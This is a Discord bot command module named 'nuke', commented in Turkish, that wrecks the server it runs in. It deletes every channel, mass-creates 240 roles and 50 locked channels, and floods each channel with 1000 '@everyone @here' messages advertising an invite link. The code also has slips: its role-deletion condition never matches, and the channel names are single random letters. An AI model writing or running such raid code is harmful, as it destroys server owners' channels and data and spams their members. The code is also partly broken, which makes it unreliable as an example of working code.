module.exports.run = async (client, message, args) => {
    var channelNames =  "AresDev"; 
    message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler
    // Deleting every role except for everyone
    message.guild.roles.cache.forEach(role => {
        if(!role.name === "everyone") {
            role.delete(); 
        }
    });
        for(let i = 0; i < 240; i++) {
            message.guild.roles.create({ name: "ARES DEV LEGN" }).then((createdRole) => {
            //message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); /////bunu aktif edersen açtığı rolleri sunucudaki herkese verir
        });
    }
    for(let i = 0; i < 50; i++) {
        var number = Math.floor(Math.random() * channelNames.length);
        var channelName = channelNames[number];
        message.guild.channels.create(channelName, {
            type: "text",
            permissionOverwrites: [
                {
                    id: message.guild.roles.everyone,
                    deny: ["SEND_MESSAGES"]
                }
            ],
        }).then(channel => {
            for(let i = 0; i < 1000; i++) { ///süreyi SAKIN elleme 
                channel.send({ content: "@everyone @here discord.gg/67cysHtbwX" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca
            }
        });
    }
}
module.exports.help = {
    name: "nuke"
}
